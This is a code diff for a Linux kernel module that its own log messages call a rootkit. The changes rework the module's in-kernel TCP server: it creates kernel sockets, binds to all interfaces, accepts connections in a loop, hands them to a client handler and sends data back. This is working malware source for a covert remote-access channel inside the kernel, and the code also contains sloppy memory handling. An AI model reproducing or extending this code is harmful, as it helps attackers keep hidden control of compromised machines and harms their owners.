@@ -21,7 +21,7 @@ struct client_t{ //structure holding client information
 };
 
 struct server_t{
-	struct sockaddr_in sin; //structure to specify a transport address and port for the AF_INET address family
+	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
 	struct socket *sock; //structure holding socket object
 	int port;
 };
@@ -42,41 +42,48 @@ static int run_server(int port){ //creates the server
 		return err; //returns -1 for error
 	}
 
-	err = memset(&(server.sin), 0, sizeof(server.sin)); //zeroes out the sin_addr
-	if (err<0){ //if error setting memory
-		printk(KERN_DEBUG "[rootkit] run_server- sin_addr memset error!\n"); //prints debug info
-		return err; //returns -1 for error
-	}
+	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr
 
 	server.port = port; //sets port of server
 
-	server.sin.sin_family = AF_INET; //sets the family
-	server.sin.sin_port = htons(server.port); //sets the port
-	server.sin.sin_addr.s_addr = INADDR_ANY; //sets the adress to any
+	server.s_addr.sin_family = AF_INET; //sets the family
+	server.s_addr.sin_port = htons(server.port); //sets the port
+	server.s_addr.sin_addr.s_addr = INADDR_ANY; //sets the adress to any
 	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
 	client.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection
 
-	err = server.sock->ops->bind(server.sock, (struct sockaddr *)&(server.sin), sizeof(server.sin)); //binds server
+	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket for server
+	if (err < 0) { //if error creating socket
+		printk(KERN_DEBUG "[rootkit] net_connect- server socket creation error!- %i\n", err); //print debug info
+		return -1; //returns -1 for error
+	}
+	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(client.sock)); //creates socket for connection
+	if (err < 0) { //if error creating socket
+		printk(KERN_DEBUG "[rootkit] net_connect- client socket creation error!- %i\n", err); //print debug info
+		return -1; //returns -1 for error
+	}
+
+	err = server.sock->ops->bind(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr)); //binds server
 	if (err<0){ //if error binding
-		printk(KERN_DEBUG "[rootkit] run_server- server bind error!\n"); //prints debug info
+		printk(KERN_DEBUG "[rootkit] run_server- server bind error!- %i\n", err); //prints debug info
 		return err; //returns -1 for error
 	}
 
 	err = server.sock->ops->listen(server.sock, 1); //listens for connections with 1 backlog
 	if (err<0){ //if error listening
-		printk(KERN_DEBUG "[rootkit] run_server- server accept error!\n"); //prints debug info
+		printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %i\n", err); //prints debug info
 		return err; //returns -1 for error
 	}
 
 	while(true){
 		err = server.sock->ops->accept(server.sock, client.sock, 0, 0); //accepts connection
 		if (err<0){ //if error accepting conn
-			printk(KERN_DEBUG "[rootkit] run_server- server accept error!\n"); //prints debug info
+			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %i\n", err); //prints debug info
 			return err; //returns -1 for error
 		}
 		err = client.client_handler();
 		if (err<0){ //if error with handling
-			printk(KERN_DEBUG "[rootkit] run_server- client handle error!\n"); //prints debug info
+			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %i\n", err); //prints debug info
 			return err; //returns -1 for error
 		}
 	}
@@ -98,11 +105,11 @@ static int net_send(void){ //sends data to the server
 
 	err = kernel_sendmsg(client.sock, &(client.sock_msg), &(client.sock_vec), 1, BUFFER_SIZE); // sends data
 	if (err < 0) { //if error sending message
-		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!\n"); //print debug info
+		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!- %i\n", err); //print debug info
 		return err; //return error
 	}
 	else if(err != BUFFER_SIZE){ //if not all data sent
-		printk(KERN_DEBUG "[rootkit] net_send- unable to send entire message\n"); //print debug info
+		printk(KERN_DEBUG "[rootkit] net_send- unable to send entire message- %i\n", err); //print debug info
 		return -1; //return -1 for error
 	}
 	return 0; //return 0 for no errors
